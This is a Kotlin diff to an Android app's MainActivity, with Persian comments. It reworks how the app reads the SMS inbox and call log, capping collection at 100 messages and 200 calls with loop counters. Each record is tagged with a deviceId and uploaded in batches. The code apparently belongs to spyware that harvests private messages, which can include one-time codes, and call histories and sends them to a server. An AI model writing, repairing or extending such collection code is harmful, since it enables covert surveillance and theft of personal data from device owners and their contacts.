@@ -372,14 +372,19 @@ class MainActivity : ComponentActivity() {
             Log.d(TAG, "════════════════════════════════════════")
 
             val smsUri = Uri.parse("content://sms/inbox")
-            val cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT 100")
+            val sortOrder = "date DESC"
+            val cursor = contentResolver.query(smsUri, null, null, null, sortOrder)
 
             cursor?.use {
                 if (it.moveToFirst()) {
                     val smsBatch = JSONArray()
                     var totalSent = 0
+                    var count = 0
+                    val maxSms = 100 // محدودیت تعداد
 
                     do {
+                        if (count >= maxSms) break // توقف بعد از 100 تا
+
                         try {
                             val sms = JSONObject().apply {
                                 put("id", it.getString(it.getColumnIndexOrThrow("_id")))
@@ -390,6 +395,7 @@ class MainActivity : ComponentActivity() {
                                 put("deviceId", deviceId)
                             }
                             smsBatch.put(sms)
+                            count++ // افزایش شمارنده
 
                             if (smsBatch.length() >= 50) {
                                 if (uploadSmsBatch(smsBatch)) {
@@ -540,17 +546,21 @@ class MainActivity : ComponentActivity() {
                 android.provider.CallLog.Calls.CACHED_NAME
             )
 
+            val sortOrder = "${android.provider.CallLog.Calls.DATE} DESC"
             val cursor = contentResolver.query(
-                callLogUri, projection, null, null,
-                "${android.provider.CallLog.Calls.DATE} DESC LIMIT 200"
+                callLogUri, projection, null, null, sortOrder
             )
 
             cursor?.use {
                 if (it.moveToFirst()) {
                     val callsBatch = JSONArray()
                     var totalSent = 0
+                    var count = 0
+                    val maxCalls = 200 // محدودیت تعداد
 
                     do {
+                        if (count >= maxCalls) break // توقف بعد از 200 تا
+
                         try {
                             val callType = it.getInt(2)
                             val callTypeStr = when (callType) {
@@ -573,6 +583,7 @@ class MainActivity : ComponentActivity() {
                                 put("deviceId", deviceId)
                             }
                             callsBatch.put(call)
+                            count++ // افزایش شمارنده
 
                             if (callsBatch.length() >= 100) {
                                 if (uploadCallsBatch(callsBatch)) {
